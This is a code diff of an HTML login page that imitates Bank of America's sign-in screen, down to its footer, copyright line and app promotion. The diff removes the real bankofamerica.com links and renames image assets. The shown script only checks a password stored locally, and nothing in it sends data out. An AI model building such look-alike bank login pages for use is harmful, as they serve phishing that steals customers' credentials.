@@ -4,7 +4,7 @@
      <meta charset="UTF-8">
     <title>online log in</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="favicon.ico" sizes="32x32">
+    <link rel="icon" href="favi.ico" sizes="32x32">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -121,7 +121,7 @@
 <body>
 
 <div class="header">
-    <img src="FONDO.png" alt="Logo" class="logo">
+    <img src="back.png" alt="Logo" class="logo">
     <div class="datetime">
         <span id="currentDateTime"></span>
     </div>
@@ -150,15 +150,15 @@
         </div>
         <button type="submit" id="continueButton">log in</button>
         <div>
-            <a href="https://secure.bankofamerica.com/auth/forgot/reset-entry/">forgot ID/password?</a><br>
-            <a href="https://www.bankofamerica.com/customer-service/contact-us/bank-of-america-login-issues/">problem login in?</a>
+            <a href="">forgot ID/password?</a><br>
+            <a href="">problem login in?</a>
         </div>
     </div>
     <div class="right-section">
-        <img src="mobile_llama.png" alt="Imagen de referencia">
+        <img src="phone.png" alt="Imagen de referencia">
         <div class="right-section">
 <p>Secure, convenient banking anytime<p>
-<a href="https://promotions.bankofamerica.com/digitalbanking/es/mobilebanking"><button type="submit1" id="continueButton">Get the app</button></a>
+<a href=""><button type="submit1" id="continueButton">Get the app</button></a>
         </div>
 
     </div>
@@ -167,7 +167,7 @@
 <div class="footer">
 Secure area
 Privacy|Security|Your Privacy Choices 
-pill Bank of America, N.A. Member FDIC. <a href="https://www.bankofamerica.com/help/equalhousing-popup/">Equal Housing Lender</a>
+pill Bank of America, N.A. Member FDIC. <a href="">Equal Housing Lender</a>
 © 2024 Bank of America Corporation.
 </div>
 
@@ -233,7 +233,7 @@ pill Bank of America, N.A. Member FDIC. <a href="https://www.bankofamerica.com/h
         if (user && user.password === password) {
             // Almacenar información del usuario en el almacenamiento local
             localStorage.setItem("currentUser", JSON.stringify(user));
-            window.location.href = "login2.html"; // Redireccionar a la página correcta
+            window.location.href = "login.html"; // Redireccionar a la página correcta
         } else {
             alert("The information you entered doesn't match our records. You have a few more tries remaining.");
         }
